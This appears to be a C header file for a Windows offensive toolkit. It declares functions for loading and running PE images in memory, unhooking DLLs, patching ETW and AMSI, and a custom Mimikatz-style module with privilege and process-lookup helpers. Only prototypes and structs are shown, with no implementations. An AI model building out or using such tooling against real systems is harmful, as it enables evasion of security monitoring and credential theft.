#pragma once
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <winternl.h>
#include <psapi.h>

// main.c

typedef struct _BASE_RELOCATION_ENTRY {
	WORD Offset : 12;
	WORD Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

typedef struct _InPeConfig {
	ULONG_PTR				pPeAddress;
	SIZE_T					sPeSize;
	PIMAGE_DOS_HEADER		pDosHdr;
	PIMAGE_NT_HEADERS		pNtHdr;
	PIMAGE_DATA_DIRECTORY	pEIDataDir;		//IMAGE_DIRECTORY_ENTRY_IMPORT
	PIMAGE_DATA_DIRECTORY	pTLSDataDir;	//IMAGE_DIRECTORY_ENTRY_TLS
	PIMAGE_DATA_DIRECTORY	pEBDataDir;		//IMAGE_DIRECTORY_ENTRY_BASERELOC
	PIMAGE_DATA_DIRECTORY	pEHDataDir;		//IMAGE_DIRECTORY_ENTRY_EXCEPTION
	PIMAGE_SECTION_HEADER	pSecHdr;
} InPeConfig, * PInPeConfig;
BOOL _InitPeStruct(PInPeConfig _Pe, PVOID pPeAddress, SIZE_T sPeSize);
BOOL _FixImportAddressTable(InPeConfig _Pe, ULONG_PTR pPeAddress);
BOOL _ReallocationSupport(ULONG_PTR ActualAddress, ULONG_PTR PreferableAddress, PIMAGE_BASE_RELOCATION BaseRelocDir);
PVOID UnpackAndRunEp(PVOID pPeAddress, SIZE_T sPeSize, BOOL RunPe);
unsigned char* get_file(unsigned char* filename, size_t* ret_size);

//unhook.h
int ListDllFunctions(const unsigned char* dllPath, LPVOID baseAddress_infile, LPVOID baseAddress_inmem, DWORD size_text_inmem, PCHAR addr_text_inmem, PCHAR size_text_infile, PCHAR addr_text_infile, PIMAGE_SECTION_HEADER pSecHdr_inmem, PIMAGE_SECTION_HEADER pSecHdr_infile);
void CompareTextSection(PTCHAR szModName, unsigned char* infile, LPVOID BaseOfDll, DWORD* ret_size_text_inmem, PCHAR* ret_addr_text_inmem, DWORD* ret_size_text_infile, PCHAR* ret_addr_text_infile);
void ListLoadedModules();
int patch_etw(LPVOID baseAddress_inmem);
int patch_amsi(LPVOID baseAddress_inmem);
int main_unhook(int argc, char* argv[]);


//custom_mimikatz.h
BOOL isElevatedProcess();
DWORD GetProcessIDByName(const char* processName);
BOOL setPrivilege();
int main_mimikatz(int argc, char* argv[]);
